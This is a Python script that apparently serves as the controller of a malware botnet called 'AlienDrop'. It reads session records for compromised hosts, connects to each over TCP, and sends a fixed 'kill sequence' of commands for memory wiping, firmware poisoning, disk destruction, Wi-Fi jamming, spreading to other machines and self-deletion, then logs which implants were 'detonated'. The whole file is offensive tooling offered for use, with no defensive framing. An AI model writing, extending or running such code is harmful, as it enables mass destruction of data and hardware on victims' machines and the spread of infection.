# MINC - AlienDrop Handler Kill Switch v3
# Global Detonation: Memory Shred • Firmware Poison • MBR Kill • Wi-Fi Jam • LAN Spread • Self-Terminate

import os
import json
import socket
import time
from datetime import datetime

SESSIONS_DIR = "output/sessions"
PORT = 5775
TIMEOUT = 4
KILL_LOG_DIR = "output/kills"
os.makedirs(KILL_LOG_DIR, exist_ok=True)

KILL_SEQUENCE = [
    "$AUTH:mincpass",
    "$MEMWIPE",
    "$FIRMPOISON",
    "$UNHOOK",
    "$RANDOMWIFIJAM",
    "$DISKMURDER",
    "$INFECTOTHERS",
    "$SYSRAGE",
    "$SELFDELETE",
    "$RELOAD"
]

def load_sessions():
    sessions = []
    for file in os.listdir(SESSIONS_DIR):
        if file.endswith(".json"):
            path = os.path.join(SESSIONS_DIR, file)
            try:
                with open(path) as f:
                    data = json.load(f)
                    sessions.append(data)
            except:
                continue
    return sessions

def send_kill_payload(ip, uuid, alias):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, PORT))
        time.sleep(1)

        try:
            sock.recv(2048)
        except:
            pass

        for cmd in KILL_SEQUENCE:
            print(f"[>] {alias} ({uuid}) => {cmd}")
            sock.send((cmd + "\n").encode())
            time.sleep(0.6)

        sock.close()
        return True
    except Exception as e:
        print(f"[x] Failed on {alias}: {e}")
        return False

def run_kill():
    print("💀 Initiating TOTAL SYSTEM WIPE ACROSS ALL IMPLANTS...")
    results = {}
    sessions = load_sessions()

    for sess in sessions:
        uuid = sess.get("uuid", "?")
        ip = sess.get("ip", None)
        alias = sess.get("alias", uuid)
        if not ip:
            continue

        print(f"\n[-] Targeting {alias} @ {ip}...")
        result = send_kill_payload(ip, uuid, alias)
        results[uuid] = {
            "alias": alias,
            "ip": ip,
            "status": "detonated" if result else "failed",
            "timestamp": datetime.now().isoformat()
        }

    with open(os.path.join(KILL_LOG_DIR, "kill_report.json"), "w") as f:
        json.dump(results, f, indent=2)

    print("\n✅ GLOBAL KILLWAVE COMPLETE.")
    print("📄 Full kill report saved to: output/kills/kill_report.json")

if __name__ == "__main__":
    run_kill()

